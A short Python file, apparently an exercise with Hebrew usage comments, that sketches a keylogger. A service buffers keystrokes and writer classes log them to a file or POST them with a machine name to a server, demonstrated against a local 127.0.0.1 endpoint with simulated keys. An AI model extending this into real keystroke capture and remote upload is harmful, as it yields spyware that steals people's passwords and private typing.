import requests

# General interface for writing
class IWriter:
    def send_data(self, data: str, machine_name: str):
        pass
# Simple implementation: writing to a file
class FileWriter(IWriter):
    def send_data(self, data: str, machine_name: str):
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f"{machine_name}: {data}\n")

# Implementation: Sending to the server
class NetworkWriter(IWriter):
    def __init__(self, endpoint: str):
        self.endpoint = endpoint

    def send_data(self, data: str, machine_name: str):
        payload = {"machine": machine_name, "data": data}
        requests.post(self.endpoint, json=payload)

# Keystroke collection service
class KeyLoggerService:
    def __init__(self):
        self._buffer = []

    def log_key(self, key: str):
        self._buffer.append(key)

    def get_logged_keys(self):
        keys = self._buffer.copy()
        self._buffer.clear()
        return keys












# ############################
# # דוגמאות שימוש!
#
# service = KeyLoggerService()
# #לקובץ
# writerFile = FileWriter()
# #לשרת
# writerNet = NetworkWriter("http://127.0.0.1:5000/api/upload")
#
# # "מדמה" הקשות
# service.log_key("Y")
# service.log_key("E")
#
# # אוספים ושולחים-לקובץ/שרת
# keys = service.get_logged_keys()
#
# writerFile.send_data("".join(keys), "computer1")
# writerNet.send_data("".join(keys), "computer2")
